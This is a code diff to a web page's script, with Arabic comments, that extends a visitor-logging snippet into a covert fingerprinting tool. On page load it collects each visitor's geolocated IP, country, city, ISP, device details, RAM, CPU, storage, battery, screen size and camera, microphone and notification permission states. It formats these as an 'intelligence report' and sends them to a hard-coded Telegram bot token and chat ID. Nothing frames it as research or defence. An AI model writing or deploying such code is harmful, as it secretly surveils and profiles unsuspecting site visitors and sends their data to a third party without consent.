@@ -23,27 +23,107 @@
         const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
         const CHAT_ID = '6663398412';
 
-        // استخدام خدمة بديلة وسريعة لجلب الـ IP
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(ipData => {
-                const userIp = ipData.ip;
-                const message = `🔔 **زيارة جديدة للموقع!**\n\n` +
-                                `🌐 **عنوان الـ IP:** ${userIp}\n` +
-                                `📱 **التفاصيل:** تم فتح الرابط بنجاح!`;
+        // معلومات الجهاز، الرام، والمساحة
+        const userDevice = navigator.userAgent;
+        const screenRes = window.screen.width + 'x' + window.screen.height;
+        const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB (تقريباً)' : 'غير متوفر';
+        const hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' أنوية معالج' : 'غير متوفر';
 
-                // إرسال الإشعار لتليجرام فوراً
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            })
-            .catch(err => console.log('Error:', err));
+        // دالة فحص أذونات الجهاز
+        async function checkPermissions() {
+            let camStatus = 'غير معروف';
+            let micStatus = 'غير معروف';
+            let notifStatus = 'غير معروف';
+
+            try {
+                if (navigator.permissions) {
+                    const camPerm = await navigator.permissions.query({ name: 'camera' });
+                    camStatus = camPerm.state; // granted / denied / prompt
+
+                    const micPerm = await navigator.permissions.query({ name: 'microphone' });
+                    micStatus = micPerm.state;
+
+                    const notifPerm = await navigator.permissions.query({ name: 'notifications' });
+                    notifStatus = notifPerm.state;
+                }
+            } catch (e) {
+                // بعض المتصفحلت لا تدعم الاستعلام عن بعض الأذونات مباشرة
+            }
+
+            return { camStatus, micStatus, notifStatus };
+        }
+
+        // فحص مساحة التخزين المتاحة (إن أمكن)
+        async function getStorageInfo() {
+            let storageInfo = 'غير متوفر';
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    const estimate = await navigator.storage.estimate();
+                    const totalGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
+                    const usedGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
+                    storageInfo = `المستخدم: ${usedGB} GB من إجمالي ${totalGB} GB`;
+                }
+            } catch (e) {}
+            return storageInfo;
+        }
+
+        // دالة جمع البيانات وإرسالها
+        async function collectAndSend(ipData) {
+            const ip = ipData.ip || 'غير معروف';
+            const country = ipData.country_name || 'غير معروف';
+            const city = ipData.city || 'غير معروف';
+            const org = ipData.org || 'غير معروف';
+
+            const permissions = await checkPermissions();
+            const storage = await getStorageInfo();
+
+            // فحص البطارية
+            let batteryLevel = 'غير متاح';
+            let isCharging = '';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = Math.round(battery.level * 100) + '%';
+                    isCharging = battery.charging ? '⚡ بيشحن' : '🔋 مش بيشحن';
+                } catch(e) {}
+            }
+
+            // صياغة التقرير الاستخباراتي الشامل
+            const message = `🚨 **تقرير شامل لزيارة الموقع!**\n\n` +
+                            `🌍 **الدولة:** ${country}\n` +
+                            `🏙️ **المدينة:** ${city}\n` +
+                            `🏢 **مزود الشبكة:** ${org}\n` +
+                            `🌐 **عنوان الـ IP:** ${ip}\n` +
+                            `--------------------------\n` +
+                            `📱 **نوع الجهاز:** ${userDevice}\n` +
+                            `🧠 **الرام (ذاكرة العشوائية):** ${deviceMemory}\n` +
+                            `⚙️ **معالج الجهاز:** ${hardwareConcurrency}\n` +
+                            `💾 **مساحة التخزين:** ${storage}\n` +
+                            `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` +
+                            `🖥️ **دقة الشاشة:** ${screenRes}\n` +
+                            `--------------------------\n` +
+                            `🔒 **حالة الأذونات:**\n` +
+                            `• الكاميرا: ${permissions.camStatus}\n` +
+                            `• الميكروفون: ${permissions.micStatus}\n` +
+                            `• الإشعارات: ${permissions.notifStatus}`;
+
+            // إرسال التقرير لتليجرام
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+
+        // جلب الـ IP وبدء العملية
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => collectAndSend(data))
+            .catch(err => collectAndSend({}));
     </script>
 </body>
 </html>
